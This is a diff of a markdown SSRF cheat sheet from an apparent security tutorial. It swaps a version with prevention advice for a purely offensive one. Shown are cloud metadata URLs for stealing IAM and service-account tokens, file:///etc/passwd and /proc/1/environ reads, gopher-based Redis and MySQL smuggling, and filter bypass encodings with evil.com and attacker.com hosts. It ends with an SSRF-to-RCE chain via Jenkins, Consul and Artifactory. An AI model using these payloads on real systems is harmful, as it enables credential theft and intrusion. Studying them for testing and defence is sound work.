@@ -1,126 +1,100 @@
-# Server-Side Request Forgery (SSRF)
+# SSRF: Server-Side Request Forgery
 
-SSRF occurs when an attacker can make the server send HTTP requests to arbitrary destinations, often bypassing firewalls and accessing internal systems.
+## Cloud Metadata Exploitation
 
-## Types of SSRF
-
-### Basic SSRF (Response is returned)
-Server fetches a URL and returns the content.
-```http
-POST /fetch-page HTTP/1.1
-url=http://169.254.169.254/latest/meta-data/     # AWS metadata
-url=http://metadata.google.internal/              # GCP metadata
-url=http://localhost:8080/admin                    # Internal admin panel
+### AWS IMDSv1 (No Token Required)
 ```
-
-### Blind SSRF (No direct response)
-Server makes a request but doesn't return the response. Use external callbacks.
-```http
-POST /webhook HTTP/1.1
-url=http://attacker.com/collect                   # Out-of-band detection
-```
-
-## Common SSRF Entry Points
-
-- URL/URI parameters (`url=`, `path=`, `dest=`, `redirect=`, `link=`)
-- File download/import functionality
-- Webhook configuration
-- Image processing from URL
-- PDF generation (wkhtmltopdf, PhantomJS)
-- Document conversion/parsing (XML import, XSLT)
-- Proxy-like functionality
-
-## Bypass Techniques
-
-### DNS Rebinding
-```bash
-# Use a DNS rebinding service
-url=http://7f000001.7f000001.rbndr.us:8080/admin   # 127.0.0.1
-url=http://n0148160.nip.io:8080/admin               # nip.io wildcard
-```
-
-### URL Parsing Confusion
-```
-http://expected.com@127.0.0.1/admin                 # Credentials bypass
-http://127.0.0.1#@expected.com/admin                 # Fragment bypass
-http://expected.com:80@127.0.0.1:443/admin           # Port confusion
-http://127.0.0.1\x00@expected.com/admin              # Null byte
-```
-
-### Redirect Bypass
-```
-http://attacker.com/redirect?to=http://169.254.169.254/
-```
-
-### Alternative Representations
-```
-http://0x7f000001/                                   # Hex IP
-http://2130706433/                                   # Integer IP
-http://0177.0.0.1/                                   # Octal IP
-http://127.1/                                        # Short IP
-http://[::1]/                                        # IPv6 localhost
-```
-
-### Protocol Smuggling
-```
-file:///etc/passwd
-gopher://localhost:6379/_*1%0d%0a$8%0d%0a...
-dict://localhost:11211/
-```
-
-## Cloud Metadata Endpoints
-
-| Provider | Metadata URL |
-|----------|--------------|
-| AWS | `http://169.254.169.254/latest/meta-data/` |
-| GCP | `http://metadata.google.internal/computeMetadata/v1/` |
-| Azure | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` |
-| DigitalOcean | `http://169.254.169.254/metadata/v1.json` |
-| Alibaba | `http://100.100.100.200/latest/meta-data/` |
-
-### AWS Metadata Endpoints
-```
+http://169.254.169.254/latest/meta-data/
 http://169.254.169.254/latest/meta-data/iam/security-credentials/
-http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
 http://169.254.169.254/latest/user-data/
-http://169.254.169.254/latest/meta-data/public-keys/
 ```
 
-## Detection Tools
+### AWS IMDSv2 Bypass
+IMDSv2 requires a token header. Bypass approaches:
+```bash
+# SSRF via AWS API endpoint
+http://instance-data.<region>.compute.amazonaws.com/
+# DNS rebinding attack
+# 1. Register domain with short TTL
+# 2. First resolution → real IP, passes checks
+# 3. Second resolution → 169.254.169.254, reads metadata
+```
 
-- **ffuf**: Fuzz parameters with SSRF-friendly payloads
-- **Interactsh**: Blind SSRF callback detection
-- **Burp Collaborator**: Integrated SSRF detection
-- **Project Discovery**: `ssrf-tool`, Nuclei SSRF templates
+### GCP Metadata
+```
+http://metadata.google.internal/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+http://metadata.google.internal/computeMetadata/v1/project/project-id
+# Requires Metadata-Flavor: Google header
+```
+
+### Azure Metadata
+```
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net
+# Requires Metadata: true header
+http://169.254.169.254/metadata/authentication?api=2015-01-01&header=01
+```
+
+## SSRF to Internal Network Pivot
+
+### Common Internal Endpoints
+```bash
+# Internal services
+http://localhost:9200/                    # Elasticsearch
+http://localhost:6379/                    # Redis (no auth typically)
+http://localhost:27017/                   # MongoDB
+http://localhost:5432/                    # PostgreSQL probing
+http://localhost:8080/                    # Common admin panel
+http://localhost:5000/                    # Flask debug
+# Kubernetes
+http://kubernetes.default.svc/
+http://10.0.0.1/                          # Default K8s gateway
+http://metadata.google.internal/          # GKE metadata
+```
+
+### Blind SSRF Detection
+```bash
+# DNS-based detection (works even when HTTP is blocked)
+# Use Burp Collaborator or interactsh
+http://collaborator.oastify.com/
+# Use HTTPS to bypass allowlists that only permit specific protocols
+https://collaborator.oastify.com/
+```
+
+## SSRF Protocol Smuggling
 
 ```bash
-# Detect SSRF parameters
-cat urls.txt | grep -E "(url|path|dest|redirect|uri|file|load|read|domain|callback|return|page|feed|host|port|to|out|view|dir|show|location)" | sort -u
-
-# Test with interactsh
-interactsh-client
-# Use generated URL as parameter value and watch for callbacks
+# Redirect-based SSRF (URL redirects to internal)
+# DNS rebinding
+# Using gopher:// protocol for TCP smuggling (gopher sends raw bytes)
+gopher://internal:6379/_*3%0d%0a...   # Redis command over gopher
+gopher://internal:3306/_...           # MySQL over gopher
+# file:// protocol bypass
+file:///etc/passwd
+file:////proc/1/environ
 ```
 
-## Exploitation: Port Scanning via SSRF
+## WAF Bypass for SSRF
 
+```bash
+# URL parsing differentials
+http://127.1/                           # Short-form IP
+http://0/                               # Localhost shorthand
+http://2130706433/                      # Decimal IP (127.0.0.1 = 2130706433)
+http://0x7f000001/                      # Hex IP
+http://0177.0.0.1/                      # Octal IP
+http://127.0.0.1:80\@evil.com/         # Credential confusion
+http://evil.com#@127.0.0.1/             # Fragment confusion
+# DNS parser bypass
+http://localhost.evil.com/              # Subdomain confusion
+http://127.0.0.1.nip.io/               # Wildcard DNS
 ```
-http://localhost:22
-http://localhost:3306
-http://localhost:6379
-http://127.0.0.1:9200       # Elasticsearch
-http://172.16.0.1:22
-http://10.0.0.1:443
-```
 
-## Prevention
+## SSRF to RCE Chain
 
-1. **Allow-list** — Only permit URLs from approved domains
-2. **Deny private IPs** — Block 127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16
-3. **Validate URL scheme** — Reject `file://`, `gopher://`, `dict://`
-4. **No redirect following** — Or validate the final URL
-5. **Isolate the service** — Run URL fetcher in a restricted network segment
-
----
-
-> **Next**: [Insecure Direct Object References (IDOR)](06-idor.md)
+1. SSRF to internal service (no auth needed)
+2. Internal service = Jenkins/Artifactory/Consul with API endpoints
+3. Jenkins: POST `/script` with Groovy script execution → RCE
+4. Consul: POST `/v1/agent/service/register` with service exec check → RCE
+5. Artifactory: PUT deploy artifact → write JSP file → access it → RCE
